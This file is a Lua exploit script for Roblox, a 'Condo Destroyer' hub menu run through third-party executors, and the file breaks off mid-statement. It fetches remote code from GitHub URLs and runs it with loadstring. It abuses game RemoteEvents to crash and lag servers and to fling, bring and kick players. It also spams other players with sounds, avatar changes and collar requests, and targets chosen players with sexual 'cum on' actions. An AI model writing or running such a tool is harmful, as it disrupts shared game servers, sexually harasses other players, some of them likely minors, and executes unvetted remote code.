local function normalize_response(res)
   local status = res.StatusCode or res.statusCode or res.status or res.Status
   local body = res.Body or res.body or res.Response or res.response or ""
   return status, body
end

getgenv().try_load = getgenv().try_load or function(urls)
    for i = 1, #urls do
        local url = urls[i]
        local ok, res = pcall(function()
            return http_requesting({ Url = url, Method = "GET" })
        end)

        if ok and res then
            local status, body = normalize_response(res)
            if status == 200 and body ~= "" and not tostring(body):find("404: Not Found") then
                local f, err = loadstring(body)
                if f then
                    local s_ok, s_res = pcall(f)
                    if s_ok then
                        return s_res
                    else
                        return { failed = true, status = "load-error", url = url, body = tostring(s_res) }
                    end
                else
                    return { failed = true, status = "compile-error", url = url, body = tostring(err) }
                end
            end
        end
    end
    return { failed = true, status = "no-response", url = urls[#urls] }
end

local github_urls = {
    Condo_Games_Ruiner_LUA_U = {
        "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/CondoGamesRuiner.lua"
    }
}

local fallback_urls = {
    Condo_Games_Ruiner_LUA_U = {
        "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/CondoGamesRuiner.lua",
        "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/CondoGamesRuiner.lua",
    }
}

local function get_script_text(name)
    local g = github_urls[name] or {}
    local f = fallback_urls[name] or {}

    for i = 1, #g do
        local res = http_requesting({ Url = g[i], Method = "GET" })
        if res and res.StatusCode == 200 and res.Body ~= "" then
            return res.Body
        end
    end

    for i = 1, #f do
        local res = http_requesting({ Url = f[i], Method = "GET" })
        if res and res.StatusCode == 200 and res.Body ~= "" then
            return res.Body
        end
    end

    return ""
end

getgenv().load_script = function(name)
    local github_list = github_urls[name] or {}
    local fallback_list = fallback_urls[name] or {}
    local result = try_load(github_list)
    if typeof(result) == "table" and result.failed then
        result = try_load(fallback_list)
    end
    return result
end

local function pick_script(name)
    local g = github_urls[name] or {}
    local f = fallback_urls[name] or {}
    local r = try_load(g)
    if typeof(r) == "table" and r.failed then
        r = try_load(f)
    end

    if typeof(r) == "table" and r.failed then
        getgenv()[name] = nil
        return nil
    end

    getgenv()[name] = r
    return r
end

local function waitForCharacter(plr, timeout)
    local start = os.clock()
    while os.clock() - start < timeout do
        local char = plr.Character
        if char and char:FindFirstChild("Head") then
            return char
        end
        if not plr.Parent then
            return nil
        end
        task.wait()
    end
    return nil
end

local Usernames = {
    "Roblox",
    "Builderman",
    "Stickmasterluke",
    "Linkmon99",
    "Shedletsky",
    "mrflimflam",
}

function change_into_user(user)
    local Target = findplr(user)
    if not Target then return getgenv().notify("Error", "Player was not found inside of game!", 5) end
    
    if Target then
        if Char_User and Char_User:IsA("RemoteEvent") then
            local args = {
                tostring(Target.Name)
            }

            Char_User:FireServer(unpack(args))
        else
            getgenv().spamming_avatars = false
            return getgenv().notify("Error", "Could not find Char RemoteEvent.", 5)
        end
    end
end

local function change_into_anyone(user)
	if not Char_User then
		getgenv().spamming_avatars = false
		return getgenv().notify("Error", "Char Remote was not found at runtime.", 5)
	end

	local selected = (user and user ~= "") and user or Usernames[math.random(1, #Usernames)]
	local args = { tostring(selected) }

	if Char_User:IsA("RemoteFunction") then
		getgenv().spamming_avatars = false
		getgenv().notify("Warning", "Char is a RemoteFunction. Using InvokeServer...", 6)
		local ok, ret = pcall(function() return Char_User:InvokeServer(unpack(args)) end)
		if not ok then
			return getgenv().notify("Error", "Invoke seems to have failed: "..tostring(ret), 7)
		end

		return ret
	end

	if Char_User:IsA("RemoteEvent") then
		local ok, err = pcall(function() Char_User:FireServer(unpack(args)) end)
		if not ok then
			return getgenv().notify("Error", "FireServer seems to have failed: "..tostring(err), 8)
		end
		return true
	end

	getgenv().spamming_avatars = false
	return getgenv().notify("Error", "Char object is not a RemoteEvent or RemoteFunction.", 5)
end

function spam_users(toggle)
    if toggle == true then
        getgenv().spamming_avatars = true
        while getgenv().spamming_avatars == true do
        task.wait()
            for _, user in ipairs(Usernames) do
                task.wait(0)
                change_into_anyone(user)
            end
        end
    elseif toggle == false then
        getgenv().spamming_avatars = false
        task.wait(0.2)
        for i = 1, 10 do
            getgenv().spamming_avatars = false
        end
        wait(0.7)
        change_into_anyone(LocalPlayer.Name)
    else
        return 
    end
end

function spam_sound_all(boolean)
    if boolean == true then
        getgenv().Spamming_Sus_Sounds_Players = true
        while getgenv().Spamming_Sus_Sounds_Players == true do
        wait(3)
            for _, v in ipairs(Players:GetChildren()) do
                if v ~= Players.LocalPlayer then
                    local Other_Plrs_Char = return_char(v, 3) or v.Character

                    if Other_Plrs_Char and Other_Plrs_Char:FindFirstChild("Humanoid") and Other_Plrs_Char:FindFirstChild("HumanoidRootPart") then
                        if Sus_Sound and Sus_Sound:IsA("RemoteEvent") then
                            local args = {
                                "Transmit",
                                Other_Plrs_Char
                            }

                            Sus_Sound:FireServer(unpack(args))
                        elseif not Sus_Sound then
                            getgenv().Spamming_Sus_Sounds_Players = false
                            wait(1.2)
                            if getgenv().Spamming_Sus_Sounds_Players then
                                for i = 1, 8 do
                                    getgenv().Spamming_Sus_Sounds_Players = false
                                end
                            end
                        end
                    end
                end
            end
        end
    elseif boolean == false then
        getgenv().Spamming_Sus_Sounds_Players = false
        wait(1.2)
        if getgenv().Spamming_Sus_Sounds_Players then
            for i = 1, 8 do
                getgenv().Spamming_Sus_Sounds_Players = false
            end
        end
    else
        return 
    end
end

task.wait(0.2)
if not getgenv().whitelist_table then
    getgenv().whitelist_table = {}
end

function whitelistplayer(player)
    if not player or not player:IsA("Player") or player.Parent ~= getgenv().Players then
        return getgenv().notify("Error", "Player does not exist in game.", 6)
    end
    
    local username = player.Name
    if table.find(getgenv().whitelist_table, username) then
        return getgenv().notify("Error", "Player is already whitelisted.", 5)
    end
    
    table.insert(getgenv().whitelist_table, username)
    return getgenv().notify("Success", tostring(username).." has been whitelisted.", 5)
end

function un_whitelist_player(player)
    if not player or not player:IsA("Player") or player.Parent ~= getgenv().Players then
        return getgenv().notify("Error", "Player does not exist in game.", 6)
    end
    
    local username = player.Name
    local index = table.find(getgenv().whitelist_table, username)
    
    if not index then
        return getgenv().notify("Error", "Player is not whitelisted.", 5)
    end
    
    table.remove(getgenv().whitelist_table, index)
    return getgenv().notify("Success", tostring(username).." has been unwhitelisted.", 5)
end

local function is_whitelisted(player)
    if not player or not player:IsA("Player") then
        return false
    end
    local username = player.Name
    return table.find(getgenv().whitelist_table, username) ~= nil
end

function fling_player(player, power)
    if not player then 
        return getgenv().notify("Error", "That player doesn't exist in-game.", 5)
    end

    if not player:IsA("Player") or player.Parent ~= getgenv().Players then
        return getgenv().notify("Error", "Player does not exist in game.", 6)
    end

    if is_whitelisted(player) then
        return 
    end
    
    power = power or 1
    
    for i = 1, power do
        force_play_anim_plr("64", player)
        force_play_anim_plr("gri", player)
        force_play_anim_plr("RoughDown2", player)
        force_play_anim_plr("max (32-)F", player)
        force_play_anim_plr("Rough pull v2F", player)
        force_play_anim_plr("6", player)
    end
end

local function getExecutor()
    local name
    if identifyexecutor then
        name = identifyexecutor()
    end
    return { Name = name or "Unknown Executor"}
end

local function detectExecutor()
    local executorDetails = getExecutor()
    return string.format("%s", executorDetails.Name)
end

local executor_Name = detectExecutor()
task.wait(0.2)
local Window 
wait(2)
if Window then
    getgenv().notify("Success", "Loading Rayfield UI...", 5)
end
wait(0.2)
if executor_Name == "Solara" or executor_Name == "Sonar" or executor_Name == "Xeno" or executor_Name == "Macsploit" then
    Window = Rayfield:CreateWindow({
        Name = "💀 Condo Destroyer 💀 | Flames Hub | "..tostring(Script_Version),
        LoadingTitle = "Enjoy, "..tostring(LocalPlayer),
        LoadingSubtitle = "Flames Hub | Wassup!",
        ConfigurationSaving = {
            Enabled = false,
            FolderName = "",
            FileName = ""
        },
        Discord = {
            Enabled = false,
            Invite = "",
            RememberJoins = true
        },
        KeySystem = false,
        KeySettings = {
            Title = "None",
            Subtitle = "No key system is provided.",
            Note = "...",
            FileName = "Key",
            SaveKey = false,
            GrabKeyFromSite = false,
            Key = {"..."}
        }
    })
else
    Window = Rayfield:CreateWindow({
        Name = "💀 Condo Destroyer 💀| Flames Hub | "..tostring(Script_Version),
        LoadingTitle = "Enjoy, "..tostring(LocalPlayer),
        LoadingSubtitle = "Flames Hub | Wassup!",
        ConfigurationSaving = {
            Enabled = false,
            FolderName = "ConfigurationFlamesHub",
            FileName = "FlamesHub"
        },
        Discord = {
            Enabled = false,
            Invite = "",
            RememberJoins = true
        },
        KeySystem = false,
        KeySettings = {
            Title = "Flames Key System",
            Subtitle = "Welcome, "..tostring(LocalPlayer),
            Note = "Hello!",
            FileName = "Admin_Key",
            SaveKey = true,
            GrabKeyFromSite = false,
            Key = {"..."}
        }
    })
end

local image_id_flames = 93594537601787
wait(0.1)
getgenv().image_flames_hub = getgenv().image_flames_hub or image_id_flames
wait(0.1)
local Tab1 = Window:CreateTab("🏡 Home 🏡", getgenv().image_flames_hub)
local Section1 = Tab1:CreateSection("||| 🏡 Home 🏡 Section |||")
local Tab2 = Window:CreateTab("🧍 LocalPlayer 🧍", getgenv().image_flames_hub)
local Section2 = Tab2:CreateSection("||| 🧍 LocalPlayer 🧍 Section |||")
local Tab3 = Window:CreateTab("👩‍👩‍👧‍👦 Players 👩‍👩‍👧‍👦", getgenv().image_flames_hub)
local Section3 = Tab3:CreateSection("||| 👩‍👩‍ Players 👩‍👩‍ Section |||")
local Tab4 = Window:CreateTab("👑 Whitelist 👑", getgenv().image_flames_hub)
local Section4 = Tab4:CreateSection("||| 👑 Whitelist 👑‍ Section |||")
local Tab5 = Window:CreateTab("🤖 Exploits 🤖", getgenv().image_flames_hub)
local Section5 = Tab5:CreateSection("||| 🤖 Exploits 🤖 Section |||")

function create_toggle(localName, Name, CurrentVal, FlagName, Tab, callback)
    local toggle = Tab:CreateToggle({
        Name = tostring(Name),
        CurrentValue = CurrentVal,
        Flag = FlagName,
        Callback = callback
    })

    getgenv()[localName] = toggle
    return toggle
end

function create_button(localName, Name, Tab, callback)
    local localName = Tab:CreateButton({
        Name = tostring(Name),
        Callback = callback
    })
end

getgenv().AutoGiveGears = getgenv().AutoGiveGears or false
wait(0.1)
if not getgenv().initialized_char_added_flames_hub_gears_task then
    getgenv().initialized_char_added_flames_hub_gears_task = true

    task.spawn(function()
        local player = getgenv().LocalPlayer or Players.LocalPlayer
        if not player then
            player = Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
            getgenv().LocalPlayer = player or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
        end

        local function onCharacter(char)
            if getgenv().AutoGiveGears == true then
                give_all_gears()
            end
        end

        if player.Character then
            onCharacter(player.Character)
        end

        player.CharacterAdded:Connect(onCharacter)
    end)
end

if Catalog_Remote and Catalog_Remote:IsA("RemoteEvent") then
    getgenv().GiveAllGears_FE = Tab5:CreateButton({
    Name = "Give Roblox Gears (FE)",
    Callback = function()
        give_all_gears()
    end,})

    getgenv().Give_All_Gears_On_Respawn = Tab5:CreateToggle({
    Name = "Give Roblox Gears (On Respawn, FE)",
    CurrentValue = false,
    Flag = "GiveRobloxGearsOnRespawnLoop",
    Callback = function(toggle_respawn_gears_loop)
        if toggle_respawn_gears_loop then
            getgenv().AutoGiveGears = true
        else
            getgenv().AutoGiveGears = false
        end
    end,})
end

if res_remote then
    getgenv().LagServer_PowerSlider = Tab5:CreateSlider({
    Name = "Lag Server Power",
    Range = {100, 10000},
    Increment = 10,
    Suffix = "",
    CurrentValue = 200,
    Flag = "CurrentLagServerPowerDefault",
    Callback = function(lag_server_power_set)
        Lag_Server_Power = lag_server_power_set
    end,})

    create_button(lag_server_FE_script, "Lag Server (FE)", Tab5, function()
        lag_server_FE()
    end)
else
    getgenv().notify("Warning", "RemoteEvent not found (crashing = disabled.)", 5)
end

--[[local Original_Crash_Power = 1000
local Crash_Power_Integer = 1000
wait(0.2)
getgenv().CrashPowerSlider = Tab5:CreateSlider({ 
Name = "Crash Server Power (BEST: 5000)",
Range = {5, 10000},
Increment = 1,
Suffix = "",
CurrentValue = Original_Crash_Power,
Flag = "SlidingCrashPower",
Callback = function(Crash_Power)
    Crash_Power_Integer = Crash_Power
end,})--]]
task.wait(0.2)
if res_remote then
    create_button("crashing_the_server_fe_2", "Crash Server (FE, More Powerful, not instant)", Tab5, function()
        crash_server_overpowered()
    end)

    create_button("crashing_the_server_fe", "Crash Server (FE, Instant + Powerful)", Tab5, function()
        crash_server()
    end)

    getgenv().KeybindForCrash_Server_Toggle = Tab5:CreateToggle({
    Name = "Keybind to crash server",
    CurrentValue = false,
    Flag = "CurrentKeybindToggledStateForCrashServerFunc",
    Callback = function(is_keybind_system_enabled)
        if is_keybind_system_enabled then
            getgenv().flames_hub_crasher_keybind_active = true
            getgenv().notify("Success", "You can now use: "..tostring(keybind_letter).." to crash the server.", 5)
        else
            getgenv().flames_hub_crasher_keybind_active = false
            getgenv().notify("Success", "Keybind system has been disabled.", 5)
        end
    end,})

    -- getgenv().key_code_to_end_server --
    getgenv().Change_Crash_Server_Keybind_If_Enabled = Tab5:CreateKeybind({
    Name = "Crash Server Keybind",
    CurrentKeybind = "F",
    HoldToInteract = false,
    Flag = "crash_server_keycode_updater",
    Callback = function(new_end_server_keycode_inputted)
        if not new_end_server_keycode_inputted or new_end_server_keycode_inputted == "" then
            new_end_server_keycode_inputted = getgenv().key_code_to_end_server
            if not new_end_server_keycode_inputted then
                return 
            end
        end

        if typeof(new_end_server_keycode_inputted) == "EnumItem" then
            getgenv().key_code_to_end_server = new_end_server_keycode_inputted
        elseif typeof(new_face_bang_keycode) == "string" then
            local foundKey = Enum.KeyCode[new_end_server_keycode_inputted:upper()]
            if foundKey then
                getgenv().key_code_to_end_server = foundKey
            end
        else
            getgenv().notify("Error", "Unexpected keybind type: "..tostring(typeof(new_end_server_keycode_inputted)), 1)
        end
    end,})
else
    getgenv().notify("Warning", "RemoteEvent not found (crashing = disabled.)", 5)
end

if Load_Event and Load_Event:IsA("RemoteEvent") then
    create_toggle("spam_afk_toggling_enabled", "Spam AFK Status (FE)", false, "SpammingAFKStatusFEToggled", Tab2, function(spam_afk_enabled)
        if not Load_Event then
            getgenv().spamming_afk_enabled = false
            spam_afk(false)
            return getgenv().spam_afk_toggling_enabled:Set(false)
        end

        if spam_afk_enabled then
            spam_afk(true)
        else
            spam_afk(false)
        end
    end)
end

if Char_User then
    create_toggle("spam_users_fe_toggled", "Spam Char Into Users (FE)", false, "SpammingIntoUsersToggled", Tab2, function(spam_toggle_users)
        if spam_toggle_users then
            spam_users(true)
        else
            spam_users(false)
        end
    end)
end

local owners_of_script = {
    ["UnstoppableAuraFarm"] = true,
    ["FarmingTooMuchAura"] = true
}

if owners_of_script[getgenv().LocalPlayer.Name] then
    getgenv().OwnerWhitelistPlr = Tab5:CreateInput({
    Name = "Whitelist Plr (for crash cmd)",
    CurrentValue = "User",
    PlaceholderText = "User",
    RemoveTextAfterFocusLost = true,
    Flag = "WhitelistCmdsPlayerForCrashServerCommand",
    Callback = function(user_to_whitelist_here)
        local this_plr_to_whitelist = findplr(user_to_whitelist_here)
        if not this_plr_to_whitelist then
            return getgenv().notify("error", "That player was not found.", 5)
        end

        if this_plr_to_whitelist then
            addChatWhitelist(this_plr_to_whitelist)
        end
    end,})

    getgenv().OwnerWhitelistPlr = Tab5:CreateInput({
    Name = "Unwhitelist Plr (for crash cmd)",
    CurrentValue = "User",
    PlaceholderText = "User",
    RemoveTextAfterFocusLost = true,
    Flag = "RemoveWhitelistPlayerForCrashServerCommand",
    Callback = function(user_to_remove_here)
        local remove_this_plrs_whitelist = findplr(user_to_remove_here)
        if not remove_this_plrs_whitelist then
            return getgenv().notify("error", "That player was not found.", 5)
        end

        if remove_this_plrs_whitelist then
            removeChatWhitelist(remove_this_plrs_whitelist.UserId)
        end
    end,})
end

local main_cum_event_loader = get_blow_load_event()
if main_cum_event_loader and main_cum_event_loader:IsA("RemoteEvent") then
    getgenv().CummingOnPlayersWhitelistSystem = getgenv().CummingOnPlayersWhitelistSystem or {}

    if not getgenv().FlamesHubRemovingWhitelistCumTargetConn then
        getgenv().FlamesHubRemovingWhitelistCumTargetConn = true

        getgenv().Players.PlayerRemoving:Connect(function(player)
            if getgenv().CummingOnPlayersWhitelistSystem[player.UserId] then
                getgenv().CummingOnPlayersWhitelistSystem[player.UserId] = nil
            end
        end)
    end
    
    local function resolve_userid(input)
        if typeof(input) == "Instance" and input:IsA("Player") then
            return input.UserId
        end
        if typeof(input) == "number" then
            return input
        end

        if typeof(input) == "string" then
            for _, plr in ipairs(getgenv().Players:GetPlayers()) do
                if plr.Name:lower() == input:lower() or plr.DisplayName:lower() == input:lower() then
                    return plr.UserId
                end
            end

            local ok, uid = pcall(function()
                return getgenv().Players:GetUserIdFromNameAsync(input)
            end)
            if ok then
                return uid
            end
        end

        return nil
    end
    wait(0.1)
    getgenv().whitelist_player_for_cumming = function(target)
        getgenv().CummingOnPlayersWhitelistSystem = getgenv().CummingOnPlayersWhitelistSystem or {}

        local uid = resolve_userid(target)
        if not uid then return end

        if getgenv().CummingOnPlayersWhitelistSystem[uid] then
            if getgenv().notify then
                getgenv().notify("Warning", "That player is already whitelisted.", 5)
            end
            return
        end

        getgenv().CummingOnPlayersWhitelistSystem[uid] = true
    end

    getgenv().remove_whitelist_player_for_cumming = function(target)
        getgenv().CummingOnPlayersWhitelistSystem = getgenv().CummingOnPlayersWhitelistSystem or {}

        local uid = resolve_userid(target)
        if not uid then return end

        if not getgenv().CummingOnPlayersWhitelistSystem[uid] then
            if getgenv().notify then
                getgenv().notify("Warning", "That player is not whitelisted.", 5)
            end
            return
        end

        getgenv().CummingOnPlayersWhitelistSystem[uid] = nil
    end

    getgenv().BlowCumOnTargetPlayer = Tab1:CreateInput({ -- what the fuck lmfao.
    Name = "Cum On Any Plr (FE)",
    CurrentValue = "User",
    PlaceholderText = "User",
    RemoveTextAfterFocusLost = true,
    Flag = "TargetPlayerToNutOnThem",
    Callback = function(plr_to_nut_all_over)
        local nut_on_this_player = findplr(plr_to_nut_all_over)
        if not nut_on_this_player then
            return getgenv().notify("Error", "That player was not found.", 5)
        end

        local nut_on_plr_char = nut_on_this_player.Character or return_char(nut_on_this_player, 30)
        if not nut_on_plr_char then
            return getgenv().notify("Error", "Their Character did not return after 30 seconds, or they left the game.", 6)
        end
        local nut_on_target_root = nut_on_plr_char:FindFirstChild("HumanoidRootPart") or get_root_with_timeout(nut_on_this_player, 30)
        if not nut_on_target_root then
            return getgenv().notify("Error", "Their HRP did not return after 30 seconds, or they left the game.", 6)
        end
        local v = nut_on_target_root.AssemblyLinearVelocity or nut_on_target_root.Velocity
        local vec = vector.create(v.X, v.Y, v.Z)

        if nut_on_this_player then
            getgenv().fire_event_with_cf(nut_on_target_root.CFrame, vec)
        end
    end,})

    getgenv().CumOnTargetPlrWhitelist = Tab1:CreateInput({ -- what the fuck lmfao.
    Name = "Cum Target Whitelist",
    CurrentValue = "User",
    PlaceholderText = "User",
    RemoveTextAfterFocusLost = true,
    Flag = "CumTargetWhitelistTblAdd",
    Callback = function(plr_to_actually_whitelist)
        local nut_plr_whitelist = findplr(plr_to_actually_whitelist)
        if not nut_plr_whitelist then
            return getgenv().notify("Error", "That player was not found.", 5)
        end

        getgenv().whitelist_player_for_cumming(nut_plr_whitelist)
    end,})

    getgenv().RemoveCumTargetWhitelistFromPlr = Tab1:CreateInput({ -- what the fuck lmfao.
    Name = "Unwhitelist Cum Target",
    CurrentValue = "User",
    PlaceholderText = "User",
    RemoveTextAfterFocusLost = true,
    Flag = "RemoveCumTargetFromWhitelistTbl",
    Callback = function(plr_whos_whitelisted_cum_tbl)
        local cum_target_alr_whitelisted = findplr(plr_whos_whitelisted_cum_tbl)
        if not cum_target_alr_whitelisted then
            return getgenv().notify("Error", "That player was not found.", 5)
        end

        getgenv().remove_whitelist_player_for_cumming(cum_target_alr_whitelisted)
    end,})

    getgenv().CumOnTargetPlayersCertainAmountOfTimes = Tab1:CreateInput({ -- what the fuck lmfao.
    Name = "Cum On Plr Amount",
    CurrentValue = "Amount",
    PlaceholderText = "Amount",
    RemoveTextAfterFocusLost = true,
    Flag = "CumTargetWithCustomAmount",
    Callback = function(amount_of_times_to_nut)
        local nut_on_players_this_many_times = tonumber(amount_of_times_to_nut) or 10

        getgenv().splash_whitelist_all_count_whitelisted_players(nut_on_players_this_many_times)
    end,})

    getgenv().SplashCumOnLoopWhitelistedPlr = Tab1:CreateToggle({
    Name = "Loop Cum On Whitelisted Plr",
    CurrentValue = false,
    Flag = "LoopNutAllOverWhitelistedPlr",
    Callback = function(is_loop_nutting_on_whitelisted_plr)
        if is_loop_nutting_on_whitelisted_plr then
            getgenv().cum_on_whitelisted_players_loop(true)
        else
            getgenv().cum_on_whitelisted_players_loop(false)
        end
    end,})
end

local find_age_remote = get_age_remote()
if find_age_remote then
    create_toggle("spam_loop_age_changing", "Loop Change Age (FE)", false, "LoopChangingAgeEz", Tab2, function(spam_changing_the_age)
        if spam_changing_the_age then
            loop_edit_age(true)
        else
            loop_edit_age(false)
        end
    end)
end

if Send_Request_RE and Send_Request_RE:IsA("RemoteEvent") then
    getgenv().SetWhitelistTargetCollarLoop = Tab4:CreateInput({
    Name = "Whitelist Collar Player",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "FuncToWhitelistCollarPlr",
    Callback = function(user_to_spam_request_collar)
        local collar_spamming_plr = findplr(user_to_spam_request_collar)
        if not collar_spamming_plr then
            return getgenv().notify("Error", "That player does not exist.", 5)
        end
        
        whitelist_collar_player(collar_spamming_plr)
    end,})

    getgenv().RemoveWhitelistCollarPlr = Tab4:CreateInput({
    Name = "Unwhitelist Collar Player",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "FuncToRemoveWhitelistedCollaredPlayer",
    Callback = function(unwhitelist_this_user)
        local collar_unwhitelist_target = findplr(unwhitelist_this_user)
        if not collar_unwhitelist_target then
            return getgenv().notify("Error", "That player does not exist.", 5)
        end
        
        unwhitelist_collar_player(collar_unwhitelist_target)
    end,})

    getgenv().SpamCollarRequestPlr_FE_Toggle = Tab4:CreateToggle({
    Name = "Spam Collar Request Player",
    CurrentValue = false,
    Flag = "TogglingSpamCollarRequestedPlayer",
    Callback = function(is_spamming_collar)
        if is_spamming_collar then
            if not has_whitelisted_collar_players() then
                getgenv().SpamCollarRequestPlr_FE_Toggle:Set(false)
                return getgenv().notify("Error", "There is nobody in the table to collar.", 5)
            end
            wait(0.1)
            spam_request_collar_plr(true)
        else
            spam_request_collar_plr(false)
        end
    end,})
end

local find_bring_target_remote_E = getgenv().Bring_Player_Original_RE_Found or getgenv().find_bring_plr_event()
if find_bring_target_remote_E and find_bring_target_remote_E:IsA("RemoteEvent") then
    function bring_player_add_to_whitelist(player)
        if typeof(player) == "Instance" and player:IsA("Player") then
            player = player.Name
        elseif typeof(player) ~= "string" then
            return getgenv().notify("Error", "Invalid Player argument.", 5)
        end

        if table.find(getgenv().bring_plr_main_tbl_whitelist, player) then
            return getgenv().notify("Warning", "This player is already whitelisted.", 5)
        end

        table.insert(getgenv().bring_plr_main_tbl_whitelist, player)
        getgenv().RefreshBringSingleDropdown()
        getgenv().notify("Success", tostring(player).." added to whitelist.", 5)
    end

    function remove_from_bring_plr_whitelist(player)
        if typeof(player) == "Instance" and player:IsA("Player") then
            if not player or not player.Name then
                return getgenv().notify("Error", "Player instance is invalid or has no name.", 5)
            end
            player = player.Name
        elseif typeof(player) ~= "string" then
            return getgenv().notify("Error", "Invalid player argument.", 5)
        end

        if not player or player == "" then
            return getgenv().notify("Error", "Player name is empty.", 5)
        end

        if not whitelist_has_players() then
            return getgenv().notify("Warning", "Whitelist is empty.", 5)
        end

        local bring_whitelist = getgenv().bring_plr_main_tbl_whitelist
        if not bring_whitelist then
            return getgenv().notify("Error", "Whitelist table doesn't exist.", 5)
        end

        local index = table.find(bring_whitelist, player)
        if not index then
            return getgenv().notify("Warning", player .. " is not in the whitelist.", 5)
        end

        table.remove(bring_whitelist, index)
        
        local success, err = pcall(function()
            if getgenv().RefreshBringSingleDropdown then
                getgenv().RefreshBringSingleDropdown()
            end
        end)
        
        if not success then
            getgenv().notify("Warning", "Removed player but UI refresh failed: " .. tostring(err), 6)
            return
        end
        
        getgenv().notify("Success", player .. " removed from whitelist.", 5)
    end

    getgenv().RefreshBringSingleDropdown = function()
        local opts = {}
        for _, name in ipairs(getgenv().bring_plr_main_tbl_whitelist or {}) do
            table.insert(opts, name)
        end
        getgenv().BringSingularUserFromTbl:Refresh(opts)
    end

    getgenv().bring_slider_power_value = 5

    getgenv().Lagging_This_Player_Out_Whitelisted = Tab5:CreateInput({
    Name = "Add To Bring Whitelist",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "PlayerToWhitelistForLagOutSystem",
    Callback = function(lagging_out_whitelisted_plr)
        local target_bring_player_for_whitelist = findplr(lagging_out_whitelisted_plr)
        if not target_bring_player_for_whitelist then
            return getgenv().notify("Error", "That player does not exist, or has left the game.", 5)
        end

        bring_player_add_to_whitelist(target_bring_player_for_whitelist)
    end,})

    getgenv().Remove_FromBring_Target_Whitelist = Tab5:CreateInput({
    Name = "Remove From Whitelist",
    CurrentValue = "User Here",
    PlaceholderText = "User Here",
    RemoveTextAfterFocusLost = true,
    Flag = "RemoveThisPlayerFromOurWhitelistSystem",
    Callback = function(bring_plr_remove_from_whitelist)
        local target_remove_from_whitelist_main = findplr(bring_plr_remove_from_whitelist)
        if not target_remove_from_whitelist_main then
            return getgenv().notify("Error", "That player does not exist, or has left the game.", 5)
        end

        remove_from_bring_plr_whitelist(target_remove_from_whitelist_main)
    end,})

    getgenv().Bring_All_Whitelisted_Plrs = Tab5:CreateToggle({
    Name = "Bring All Whitelisted Players (FE)",
    CurrentValue = false,
    Flag = "BringingWhitelistedPlayersLoop",
    Callback = function(all_whitelisted_plrs_bringing)
        if all_whitelisted_plrs_bringing then
            getgenv().kick_player_firing_func()
        else
            getgenv().kick_player_firing_func()
        end
    end,})

    getgenv().BringAll_ToYou_FE_Toggle = Tab5:CreateToggle({
    Name = "Bring all To You (FE)",
    Currentvalue = false,
    Flag = "BringingAllPlrsToYouLiterally",
    Callback = function(bringing_all_to_myself)
        if bringing_all_to_myself then
            getgenv().kick_firing_function_toggle()
        else
            getgenv().kick_firing_function_toggle()
        end
    end,})

    getgenv().BringEveryone_FE_All_Players_In_Game = Tab5:CreateToggle({
    Name = "Bring Everyone In Game (FE)",
    CurrentValue = false,
    Flag = "BringEveryPlayerInGameToYouFE",
    Callback = function(bring_everyone_in_game)
        if bring_everyone_in_game then
            getgenv().bringing_everyone_in_the_game = true

            local bring_plr_RE = getgenv().Bring_Player_Original_RE_Found or getgenv().find_bring_plr_event()
            if not bring_plr_RE then
                getgenv().bringing_everyone_in_the_game = false
                return getgenv().notify("Error", "Could not find BringPlayerEvent (patched?).", 6)
            end

            while getgenv().bringing_everyone_in_the_game == true do
                task.wait(0.2)
                for _, v in ipairs(game.Players:GetPlayers()) do
                    task.wait(0.1)
                    bring_plr_RE:FireServer(v)
                end
            end
        else
            getgenv().bringing_everyone_in_the_game = false
        end
    end,})

    getgenv().BringIntensityTargetPlrSlider = Tab5:CreateSlider({
    Name = "Bring Intensity",
    Range = {1, 75},
    Increment = 1,
    Suffix = "",
    CurrentValue = getgenv().bring_slider_power_value,
    Flag = "BringSliderIntensityEditing",
    Callback = function(new_value)
        pcall(function()
            getgenv().bring_slider_power_value = new_value
        end)
    end,})

    getgenv().BringSingularUserFromTbl = Tab5:CreateDropdown({
    Name = "Bring/Lag Single Player (FE)",
    Options = {},
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown_BringSingle",
    Callback = function(selection)
        if typeof(selection) ~= "table" then
            return getgenv().notify("Error", "Invalid dropdown selection.", 5)
        end

        local selected = selection[1]
        if typeof(selected) ~= "string" then
            return getgenv().notify("Error", "No player selected.", 5)
        end

        if not table.find(getgenv().bring_plr_main_tbl_whitelist, selected) then
            return getgenv().notify("Error", selected .. " is not whitelisted.", 5)
        end

        getgenv().bring_loop_kick_plr_singular(selected, getgenv().bring_slider_power_value)
        getgenv().notify("Success", "Targeting " .. selected .. " with intensity " .. getgenv().bring_slider_power_value, 5)
    end,})

    getgenv().RefreshBringSingleDropdown()

    if not getgenv().InitializedBringPlayerGlobalFlagForPlayerRemoving then
        getgenv().InitializedBringPlayerGlobalFlagForPlayerRemoving = true

        local Players = getgenv().Players or game:GetService("Players")

        Players.PlayerRemoving:Connect(function(plr)
            local tbl = getgenv().bring_plr_main_tbl_whitelist
            if not tbl or not next(tbl) then
                return 
            end

            local index = table.find(tbl, plr.Name)
            if index then
                getgenv().bring_cycle_active = false
                getgenv().bring_cycle_running = false
                table.remove(tbl, index)
                if getgenv().RefreshBringSingleDropdown then
                    getgenv().RefreshBringSingleDropdown()
                end
                if getgenv().bring_cycle_active == true then
                    getgenv().BringAll_ToYou_FE_Toggle:Set(false)
                end
                if getgenv().bring_cycle_running == true then
                    getgenv().Bring_All_Whitelisted_Plrs:Set(false)
                end
                getgenv().notify(
                    "Success",
                    "Player Left: " .. plr.Name .. ", removed from whitelist.",
                    6
                )
            end
        end)
    end
end

local get_sitting_tool

if get_tool(getgenv().Backpack) then
    get_sitting_tool = get_tool(getgenv().Backpack)
elseif get_tool(getgenv().Character) then
    get_sitting_tool = get_tool(getgenv().Character)
else
    get_sitting_tool = nil
end

if getgenv().Chat_Remote_Event and getgenv().Chat_Remote_Event:IsA("RemoteEvent") then
